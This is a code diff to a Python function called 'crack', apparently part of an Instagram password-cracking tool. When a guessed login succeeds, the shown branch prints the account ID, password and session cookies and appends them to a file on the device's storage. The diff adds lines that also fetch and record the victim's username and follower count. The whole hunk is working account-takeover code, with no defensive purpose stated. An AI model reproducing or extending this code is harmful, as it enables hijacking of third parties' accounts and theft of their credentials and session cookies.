@@ -170,16 +170,32 @@ def crack(uid, pww, total_idz):
                 if json_response.get('status') == 'ok':
                    if json_response.get('authenticated') == True:
                         session_cookies = response.cookies.get_dict()
+                        username = json_response.get('user', {}).get('username', 'Unknown')
+                        profile_url = f'https://www.instagram.com/{username}/?__a=1'
+                        profile_response = session.get(profile_url, cookies=cookies, headers=headers)
+                        profile_json = profile_response.json()
+                        user_data = profile_json.get('graphql', {}).get('user', {})
+                        followers_count = user_data.get('edge_followed_by', {}).get('count', 'Unknown')
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [username] {username}")
+                        print(f"\r\033[1;92m [followers] {followers_count}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{username}|{pw}|{session_cookies}\n")
                         oks.append(uid)
                         return True
                    elif  json_response.get('auth_token'):
                         session_cookies = response.cookies.get_dict()
+                        username = json_response.get('user', {}).get('username', 'Unknown')
+                        profile_url = f'https://www.instagram.com/{username}/?__a=1'
+                        profile_response = session.get(profile_url, cookies=cookies, headers=headers)
+                        profile_json = profile_response.json()
+                        user_data = profile_json.get('graphql', {}).get('user', {})
+                        followers_count = user_data.get('edge_followed_by', {}).get('count', 'Unknown')
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [username] {username}")
+                        print(f"\r\033[1;92m [followers] {followers_count}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{username}|{pw}|{session_cookies}\n")
                         oks.append(uid)
                         return True
             else:
